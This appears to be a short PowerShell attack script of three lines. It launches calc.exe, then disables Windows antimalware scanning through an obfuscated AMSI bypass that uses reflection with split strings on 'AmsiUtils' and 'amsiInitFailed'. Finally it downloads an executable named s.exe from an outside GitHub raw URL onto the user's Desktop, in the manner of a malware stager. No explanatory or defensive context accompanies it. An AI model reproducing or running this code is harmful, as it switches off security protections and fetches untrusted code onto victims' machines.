Start-Process "calc.exe"
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/s.exe" -OutFile "$env:USERPROFILE\Desktop\s.exe"

